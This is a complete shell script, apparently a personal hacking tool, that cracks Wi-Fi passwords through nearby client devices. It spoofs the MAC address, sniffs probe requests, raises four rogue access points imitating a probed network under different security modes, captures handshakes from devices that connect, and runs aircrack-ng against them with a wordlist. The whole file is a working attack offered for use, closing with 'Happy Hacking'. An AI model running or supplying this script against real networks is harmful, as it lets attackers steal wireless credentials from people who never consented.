#!/bin/sh
clear
echo "********************************************"
echo "  				                                  "
echo "		WIFI - HONEYPOT		                      "
echo "		 Client-Cracker	                        "
echo "********************************************"
echo "Cracking Wifi Password with just the client "
echo " 		By- Achute Sharma                       "
echo "				    @achute                         "
echo "********************************************"
echo "********************************************"
echo -n "Wireless interface wlan1 or wlan0 ??"
read iface
echo "-> we will start the monitor mode in mon0 "
ifconfig $iface down
macchanger -r $iface
ifconfig $iface up
airmon-ng start $iface
echo "well dats done .. "
echo "we will start the airodumpn-ng please note the probe name "
xterm -bg black -fg green -e airodump-ng mon0 &
pid1=$!
echo "note the name below the probe once you have got it close "
echo "the small window"
echo "also note the channel please "
echo -n "whats the essid i.e probe name"
read essid
echo -n " channel ??"
read ch
kill $pid1
echo "CREATING FOUR FAKE AP with the name os $essid "
airmon-ng start $iface #open mon1
airmon-ng start $iface #wep mon2
airmon-ng start $iface #wpa mon3
airmon-ng start $iface #wpa2 psk mon4
sleep 2
xterm -e airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon1 &
pid2=$!
sleep 2
xterm -e airbase-ng --essid $essid -a bb:bb:bb:bb:bb:bb -c $ch mon2 -W 1 &
pid3=$!
sleep 2
xterm -e airbase-ng --essid $essid -a cc:cc:cc:cc:cc:cc -c $ch mon3 -W 1 -z 2 &
pid4=$!
sleep 2
xterm -e airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon4 -W 1 -Z 4 &
pid5=$!
sleep 2
echo "all ap up and running ...woooh "
echo "Dumping The Handshake If Any ..!! Oh ya ..!! "
echo -n "give it a file name "
read fname
echo "If there is any handshake close the dialog box ... "
xterm -e airodump-ng --channel $ch --write $fname mon0
sleep 2
kill $pid2
kill $pid3
kill $pid4
kill $pid5
echo "Launching the aircrack missile ... we did it .. HOPEFULLY"
aircrack-ng -w /usr/share/rockyou.txt $fname-01.cap
sleep 3
echo -n "So we done ya.. lets quit. shall we"
read s
airmon-ng stop mon4
airmon-ng stop mon3
airmon-ng stop mon2
airmon-ng stop mon1
airmon-ng stop mon1
echo "Bye Bye ....Happy Hacking .. "
